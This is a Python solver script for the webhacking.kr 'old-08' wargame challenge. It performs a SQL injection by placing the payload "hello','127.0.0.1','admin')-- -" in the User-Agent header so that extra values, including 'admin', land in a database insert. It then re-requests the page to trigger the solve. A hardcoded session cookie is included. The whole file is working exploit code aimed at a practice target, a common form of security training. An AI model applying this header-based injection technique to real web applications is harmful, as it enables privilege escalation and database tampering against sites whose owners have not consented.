import requests

url = "https://webhacking.kr/challenge/web-08"
cookie = {'PHPSESSID':'89meds6e5pvddsmsbtr2qrick4'}
header = {"User-Agent": ""}

def sqli():
    header["User-Agent"] = "hello\',\'127.0.0.1\',\'admin\')-- -"
    print(header)
    res = requests.get(url, headers=header, cookies=cookie)
    if "done!" in res.text:
        print("done!")

def solve():
    header["User-Agent"] = "hello"
    print(header)
    res = requests.get(url, headers=header, cookies=cookie)
    if "old-08 Pwned!" in res.text:
        print("old-08 Pwned!")
    elif "already solve" in res.text:
        print("already solve")

if __name__ == "__main__":
    sqli()
    solve()